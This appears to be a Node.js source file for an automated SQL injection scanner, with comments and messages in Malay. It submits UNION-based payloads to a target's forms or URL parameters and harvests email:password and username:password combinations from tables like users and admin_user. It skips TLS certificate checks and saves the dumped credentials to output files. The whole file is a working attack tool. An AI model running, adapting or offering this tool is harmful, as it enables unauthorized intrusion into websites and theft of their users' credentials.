// 📁 scanner-extreme.js (Auto DIOS follow-up on column match)
const axios = require('axios');
const qs = require('qs');
const cheerio = require('cheerio');
const fs = require('fs');
const path = require('path');
const https = require('https');
const urlLib = require('url');
const agent = new https.Agent({ rejectUnauthorized: false });

function extractEmailPass(text) {
  const lines = text.split(/\r?\n/);
  return lines.filter(line => line.match(/[\w._%+-]+@[\w.-]+\.[a-zA-Z]{2,}.+?:.+/));
}

function extractErrors(text) {
  const regex = /([\w@:\/\-\.]{8,})/g;
  const blacklist = ['submitDIRSearch','stylesheet','srcElement','readyState','XMLHttpRequest','onkeypress','ActiveXObject','Transactions','Setiausaha','Industrial','Pentadbiran','Pengurusan','Perkhidmatan','Perjanjian','Pendaftaran','Perpustakaan','Jurubahasa','Juruterapi','Jururawat','Juruteknik','Penghantar','Kakitangan','Technician','onlineservices'];
  return [...new Set([...text.matchAll(regex)].map(m => m[1]))].filter(e => {
    return !blacklist.includes(e) && !/^[a-z]+$/.test(e) && (e.includes(':') || e.match(/[A-Z0-9]{8,}/));
  });
}

function getPayloadList(mode = 'auto') {
  const diosPayloads = [
    "' UNION SELECT null, concat(username,0x3a,password) FROM users--",
    "' UNION SELECT null, concat(user,0x3a,pass) FROM members--",
    "' UNION SELECT null, concat(email,0x3a,password) FROM admin_user--",
    "' UNION SELECT null, concat(email,0x3a,password) FROM users--"
  ];
  if (mode === 'full') {
    return [
      "' OR 1=1--",
      "' UNION SELECT null, version()--",
      "' UNION SELECT null, table_name FROM information_schema.tables--",
      "' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users'--",
      ...diosPayloads
    ];
  }
  return [
    "' OR 1=1--",
    "' UNION SELECT null, version()--",
    "' UNION SELECT null, table_name FROM information_schema.tables--",
    ...diosPayloads
  ];
}

async function handlePowerExtremeScan(url, mode = 'auto') {
  const log = [];
  const push = (msg) => {
    log.push(msg);
    console.log('[SCANNER]', msg);
  };

  const resultDump = {
    target: url,
    mode,
    tables: [],
    columns: {},
    values: {},
    emails: [],
    errors: []
  };

  try {
    push(`[+] Target: ${url}`);
    const payloads = getPayloadList(mode);
    const res = await axios.get(url, { httpsAgent: agent });
    const $ = cheerio.load(res.data);
    const form = $('form').first();
    const action = form.attr('action') || url;
    const targetUrl = action.startsWith('http') ? action : new URL(action, url).href;
    const inputs = form.find('input');
    const fields = {};
    const visible = [];

    inputs.each((i, el) => {
      const name = $(el).attr('name');
      const type = ($(el).attr('type') || '').toLowerCase();
      if (!name) return;
      fields[name] = 'test';
      if (!['hidden', 'submit', 'button'].includes(type)) {
        visible.push(name);
      }
    });

    const doExtract = async (target, payload, method, paramLabel) => {
      try {
        const r = method === 'GET' ? await axios.get(target, { httpsAgent: agent })
                                   : await axios.post(targetUrl, qs.stringify(target), {
                                        headers: {
                                          'Content-Type': 'application/x-www-form-urlencoded',
                                          'User-Agent': 'Mozilla/5.0 (ScannerPowerExtreme)'
                                        }, httpsAgent: agent, timeout: 10000 });
        const text = r.data;
        const size = text.length;
        const matched = ['sql','error','mysql','table'].filter(k => text.toLowerCase().includes(k));
        push(`${matched.length ? '⚠️' : '✅'} Payload → ${paramLabel}: ${payload} → Respon ${size} byte`);

        const foundCombo = extractEmailPass(text);
        if (foundCombo.length) {
          resultDump.emails.push(...foundCombo);
          foundCombo.forEach(c => push(`  → ${c}`));
        }

        const errors = extractErrors(text);
        if (errors.length) {
          resultDump.errors.push(...errors);
          errors.forEach(e => push(`❗ Error Extracted → ${e}`));
        }
      } catch (err) {
        push(`❌ Payload → ${paramLabel}: ${payload} → Ralat: ${err.code || err.message}`);
      }
    };

    if (visible.length === 0) {
      push(`[!] Tiada input visible yang boleh diinject. Cuba fallback ke GET mode...`);
      const parsed = urlLib.parse(url, true);
      const queryParams = Object.keys(parsed.query);
      if (queryParams.length === 0) {
        push(`[!] Tiada parameter dalam URL untuk GET injection.`);
        return log;
      }
      for (let payload of payloads) {
        for (let param of queryParams) {
          const newQuery = { ...parsed.query, [param]: payload };
          const newUrl = `${parsed.protocol}//${parsed.host}${parsed.pathname}?${qs.stringify(newQuery)}`;
          await doExtract(newUrl, payload, 'GET', param);
        }
      }
    } else {
      push(`📥 Dikesan input: ${visible.join(', ')}`);
      for (let payload of payloads) {
        for (let field of visible) {
          const data = { ...fields, [field]: payload };
          await doExtract(data, payload, 'POST', field);
        }
      }
    }

    push(`[✓] Selesai SQLi scan (${mode} mode).`);
    const outputDir = path.join(__dirname, 'output');
    if (!fs.existsSync(outputDir)) fs.mkdirSync(outputDir);
    const filename = `scanner-${mode}-${Date.now()}`;
    fs.writeFileSync(path.join(outputDir, `${filename}.txt`), log.join("\n"), 'utf8');
    fs.writeFileSync(path.join(outputDir, `${filename}.json`), JSON.stringify(resultDump, null, 2), 'utf8');
    push(`[💾] Log disimpan → output/${filename}.txt`);
    push(`[📁] Dump disimpan → output/${filename}.json`);
    return log;
  } catch (err) {
    push(`[!] Gagal akses: ${err.message}`);
    return log;
  }
}

module.exports = { handlePowerExtremeScan };
